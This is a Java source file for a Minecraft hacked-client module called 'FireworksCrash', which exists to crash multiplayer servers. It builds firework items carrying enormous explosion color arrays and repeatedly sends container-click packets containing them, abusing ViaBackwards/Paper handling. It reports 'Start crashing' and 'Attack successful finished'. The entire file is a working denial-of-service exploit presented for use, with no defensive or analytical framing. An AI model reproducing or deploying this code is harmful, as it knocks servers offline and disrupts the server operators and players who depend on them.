package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataFireworks;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

public class FireworksCrash extends Module {
	private ScheduledExecutorService executorService;

	public FireworksCrash() {
		super("Fireworks", "Fireworks explosion color-array bomb (ViaBackwards / Paper Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "100");
		addArgument("explosions", ArgumentType.INT, 1, 4096, "64");
		addArgument("colors", ArgumentType.INT, 1, 2096000, "4096");
		addArgument("map size", ArgumentType.INT, 1, 46, "16");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "1");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int explosions = context.getInt("explosions");
		int colors = context.getInt("colors");
		int mapSize = context.getInt("map size");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		setEnabled(true);

		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.FULL_ITEM_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
			return;
		}

		int[] colorArray = new int[colors];
		Arrays.fill(colorArray, 0xFFFFFF);
		int[] fadeArray = new int[Math.min(colors, 256)];
		Arrays.fill(fadeArray, 0xFF00FF);

		List<DataFireworks.Explosion> explosionList = new ArrayList<>(explosions);
		DataFireworks.Explosion explosion = new DataFireworks.Explosion(0, colorArray, fadeArray, true, true);
		for (int i = 0; i < explosions; i++) {
			explosionList.add(explosion);
		}

		DataComponents components = new DataComponents();
		components.put(new DataFireworks(127, explosionList));
		ItemStack stack = new ItemStack(ItemType.FIREWORK_ROCKET.getId(protocol), 1, components);

		Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
		for (int j = 0; j < mapSize; ++j) {
			int2objectmap.put(j, stack);
		}

		context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

		AtomicInteger check = new AtomicInteger(0);
		executorService = Executors.newSingleThreadScheduledExecutor();
		Runnable clickTask = () -> {
			if (!isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
					|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
				executorService.shutdown();
				setEnabled(false);
				if (Minecraft.getInstance().getConnection() != null) {
					context.sendMessage("Attack <green>successful <white>finished!");
				}
			} else {
				PacketCodec.sendPacket(new PacketContainerClick(
								protocol,
								0,
								1,
								10,
								PacketContainerClick.ContainerActionType.CLICK_ITEM,
								PacketContainerClick.ContainerAction.RIGHT_CLICK,
								stack,
								int2objectmap),
						packets);
			}

			check.getAndIncrement();
		};
		executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		if (executorService != null) {
			executorService.shutdownNow();
		}
	}
}
